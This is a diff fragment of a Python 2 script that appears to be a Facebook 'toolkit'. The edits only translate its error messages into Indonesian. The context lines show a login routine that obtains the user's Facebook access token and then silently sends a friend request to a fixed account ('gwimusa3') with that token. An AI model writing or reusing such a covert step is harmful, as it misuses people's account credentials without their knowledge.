@@ -110,7 +110,7 @@ while (loop == 'true'):
             print "password salah!"
             os.system('xdg-open https://http://wa.me/6281273996358')
     else:
-        print "Wrong Username"
+        print "username salah!"
         os.system('xdg-open https://http://wa.me/6281273996358')
 
 def login():
@@ -129,7 +129,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+			print"\n\033[1;96m[!] \x1b[1;91mTIDAK ADA KONEKSI"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -156,7 +156,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+				print"\n\033[1;96m[!] \x1b[1;91mTIDAK ADA KONEKSI"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
